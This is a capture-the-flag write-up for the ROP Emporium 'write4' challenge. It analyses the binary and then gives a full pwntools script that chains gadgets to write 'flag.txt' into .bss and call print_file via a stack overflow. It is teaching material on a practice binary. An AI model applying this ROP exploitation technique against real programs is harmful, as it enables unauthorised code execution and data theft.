# Challenge 4 - write4
## Description
This is the fourth of the ROP Emporium challenges. [write4](https://ropemporium.com/challenge/write4.html)

"Find and manipulate gadgets to construct an arbitrary read primitive, then use it to learn where and how to get your data into process memory."

Quick look at the binary info and running it
```
mfumega@pwn-boy:/pwn-boy$ file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
mfumega@pwn-boy:/pwn-boy$ pwn checksec write4
[*] '/pwn-boy/write4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
mfumega@pwn-boy:/pwn-boy$
mfumega@pwn-boy:/pwn-boy$ ./write4
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAA
Thank you!
mfumega@pwn-boy:/pwn-boy$
```

Based on what the challenge says on the page,  there is NO "/bin/cat flag.txt" string, and we must somehow open the "flag.txt" file. Let's look at the gadgets, aswell as the functions within the binary: 

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
pwndbg> disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:     push   rbp
   0x0000000000400618 <+1>:     mov    rbp,rsp
   0x000000000040061b <+4>:     mov    edi,0x4006b4
   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:    nop
   0x0000000000400626 <+15>:    pop    rbp
   0x0000000000400627 <+16>:    ret
End of assembler dump.
pwndbg> disassemble print_file
Dump of assembler code for function print_file@plt:
   0x0000000000400510 <+0>:     jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>
   0x0000000000400516 <+6>:     push   0x1
   0x000000000040051b <+11>:    jmp    0x4004f0
End of assembler dump.
pwndbg> disassemble usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:     ret
   0x000000000040062c <+4>:     nop    DWORD PTR [rax+0x0]
End of assembler dump.
pwndbg>
```

Well, the challenge also told us "Once you've figured out how to write your string into memory and where to write it, go ahead and call `print_file()` with its location as its only argument.

So, basically we must write "flag.txt" somewhere in memory, and then pass the address containing that string to the "print_file()" as an argument. 

The challenge is giving us the following register `mov [r14], r15`. What is this doing? 
Well, it's gonna move whatever is r15 equal to, into the address r14 points. 

For instance if we have r15 = "random", and r14 = 0xdeadbeef, if we use that instruction, it will store "random" at the memory address 0xdeadbeef. 
So, long story short, it's a gadget that let us write into memory. 

This is called a "writing primitive". 

And where are we going to write our string? LEt's see which parts of our binary are we allowed to write: 
```
mfumega@pwn-boy:/pwn-boy$ readelf -S write4
There are 29 section headers, starting at offset 0x1980:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.bu[...] NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       0000000000000038  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002d0  000002d0
       00000000000000f0  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           00000000004003c0  000003c0
       000000000000007c  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040043c  0000043c
       0000000000000014  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400450  00000450
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400470  00000470
       0000000000000030  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000004004a0  000004a0
       0000000000000030  0000000000000018  AI       5    22     8
  [11] .init             PROGBITS         00000000004004d0  000004d0
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004004f0  000004f0
       0000000000000030  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000400520  00000520
       0000000000000182  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         00000000004006a4  000006a4
       0000000000000009  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         00000000004006b0  000006b0
       0000000000000010  0000000000000000   A       0     0     4
  [16] .eh_frame_hdr     PROGBITS         00000000004006c0  000006c0
       0000000000000044  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000400708  00000708
       0000000000000120  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00
       00000000000001f0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
  [25] .comment          PROGBITS         0000000000000000  00001038
       0000000000000029  0000000000000001  MS       0     0     1
  [26] .symtab           SYMTAB           0000000000000000  00001068
       0000000000000618  0000000000000018          27    46     8
  [27] .strtab           STRTAB           0000000000000000  00001680
       00000000000001f6  0000000000000000           0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  00001876
       0000000000000103  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)
mfumega@pwn-boy:/pwn-boy$
```

We have writing access to the sections [18] to [24]. 
".bss" is where we are going to write our string into. 

So, we now need to pick our gadgets. We know that we must pass the address with our string to "usefulFunction", so we're gonna need "RDI", and we must play with r14 and r15 registers. So we need the "mov [r14], r15" gadget amd a way tp put the values there with a "pop r14, r15" instruction.

```
mfumega@pwn-boy:/pwn-boy$ ropper --file write4 --search "mov [r14]"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [r14]

[INFO] File: write4
0x0000000000400628: mov qword ptr [r14], r15; ret;

mfumega@pwn-boy:/pwn-boy$ ropper --file write4 --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: write4
0x0000000000400693: pop rdi; ret;

mfumega@pwn-boy:/pwn-boy$
```

Now we can build our exploit with pwntools as follows: 

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
binary_path = '/pwn-boy/write4'
p = process(binary_path)
#p = gdb.debug(binary_path)
e = p.elf

# Addresses
pop_r14_r15 = p64(0x400690)
mov_r14_r15 = p64(0x400628)
pop_rdi = p64(0x400693)
print_file = p64(0x400620)
bss_addr = p64(0x601038)


offset = 40

payload = b'A' * offset
payload += pop_r14_r15 + bss_addr + b'flag.txt'
payload += mov_r14_r15
payload += pop_rdi + bss_addr
payload += print_file


p.send(payload)
response = p.recvall()
print(response.decode())
```

aaaaand we got the flag :D

